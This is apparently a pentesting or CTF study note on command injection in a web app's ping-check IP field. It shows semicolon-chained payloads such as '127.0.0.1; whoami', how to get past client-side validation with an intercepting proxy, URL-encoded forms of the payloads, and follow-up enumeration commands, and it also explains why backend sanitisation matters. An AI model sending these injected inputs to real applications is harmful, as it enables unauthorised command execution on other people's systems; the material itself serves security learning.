# Command Injection – Injecting Commands

## Overview

Once we suspect command injection is possible, the next step is to attempt execution of arbitrary commands.

The goal is to:

- append a second command to the original command
- observe differences in output
- confirm whether the application executes OS-level commands
- bypass any client-side protections

In this example, the web application performs a ping check on user-supplied IP addresses.

Likely backend command:

```bash
ping -c 1 USER_INPUT
```

If input is not sanitised, we may inject additional commands.

---

# 1. Using the Semicolon Operator (;)

The semicolon operator allows sequential command execution.

Operator:

```
;
```

Example payload:

```
127.0.0.1; whoami
```

Executed command:

```bash
ping -c 1 127.0.0.1; whoami
```

Execution behaviour:

1. first command runs
2. second command runs regardless of success or failure

---

# 2. Testing Payload Locally

Before using payloads in a target application, test them locally to confirm syntax validity.

Example:

```bash
ping -c 1 127.0.0.1; whoami
```

Expected output:

```
PING 127.0.0.1 ...

www-data
```

Confirms payload structure is valid.

Testing locally reduces troubleshooting complexity.

---

# 3. Attempting Injection in Web Application

Initial payload:

```
127.0.0.1; whoami
```

Application response:

```
Invalid input
```

Indicates input validation is blocking payload.

However, behaviour suggests validation occurs on the client-side.

---

# 4. Identifying Client-Side Validation

Signs validation is occurring in browser:

- error message displayed instantly
- no HTTP request sent
- no server interaction visible
- validation triggered before submission

Verification using browser developer tools:

Open Network tab:

```
CTRL + SHIFT + E
```

Resubmit payload.

Observation:

no network request generated.

Conclusion:

validation enforced via JavaScript.

Client-side validation is not secure.

It can be bypassed easily.

---

# 5. Why Client-Side Validation Fails

Client-side controls:

- exist in user-controlled environment
- rely on browser execution
- can be modified or bypassed
- cannot prevent malicious requests

Attackers can:

- intercept requests
- modify payloads
- send requests directly to server
- bypass browser restrictions

Front-end validation improves usability but does not provide security.

Security must exist on backend.

---

# 6. Bypassing Front-End Validation Using Proxy

Intercept request using proxy tool:

Tools:

- Burp Suite
- OWASP ZAP

Workflow:

1. configure browser proxy settings
2. enable intercept
3. send normal request
4. capture HTTP request
5. modify payload
6. forward modified request

---

# 7. Example HTTP Request Modification

Original request:

```
ip=127.0.0.1
```

Modified request:

```
ip=127.0.0.1; whoami
```

URL encoded payload:

```
127.0.0.1%3b%20whoami
```

Encoded characters:

| Character | Encoding |
|----------|----------|
| ; | %3b |
| space | %20 |

---

# 8. Successful Injection Result

Server response includes output from both commands:

```
PING 127.0.0.1 ...

www-data
```

Indicates:

- backend executes system commands
- user input not sanitised
- command injection vulnerability confirmed

---

# 9. Testing Alternative Commands

Once injection confirmed, test additional commands.

Common enumeration commands:

```
whoami
id
hostname
pwd
uname -a
ls
```

Example payloads:

```
127.0.0.1; id
127.0.0.1; pwd
127.0.0.1; hostname
127.0.0.1; uname -a
```

---

# 10. Practical Workflow

Step 1 – identify input field

Example:

Host Checker IP field.

Step 2 – test baseline input

```
127.0.0.1
```

Step 3 – test injection operator

```
127.0.0.1; whoami
```

Step 4 – confirm execution

Look for additional output.

Step 5 – expand enumeration

Run additional commands.

---

# 11. Key Observations

- front-end validation does not provide security
- proxy tools allow full request control
- semicolon operator executes multiple commands
- URL encoding ensures payload integrity
- command injection confirmed via output differences
- backend must sanitise user input to prevent exploitation

---

# 12. Quick Payload Reference

Basic injection:

```
127.0.0.1; whoami
```

URL encoded:

```
127.0.0.1%3b%20whoami
```

Enumeration examples:

```
127.0.0.1; id
127.0.0.1; pwd
127.0.0.1; hostname
127.0.0.1; uname -a
```

---

# 13. Key Takeaways

- command injection occurs when input is passed directly into OS commands
- semicolon allows sequential execution
- client-side validation can be bypassed easily
- intercepting HTTP requests allows payload manipulation
- differences in output confirm vulnerability
- enumeration commands help understand system context

---

# Tags

#command-injection
#rce
#burp
#input-validation
#web-security
#pentesting
#ctf
#linux
#recon
#obsidian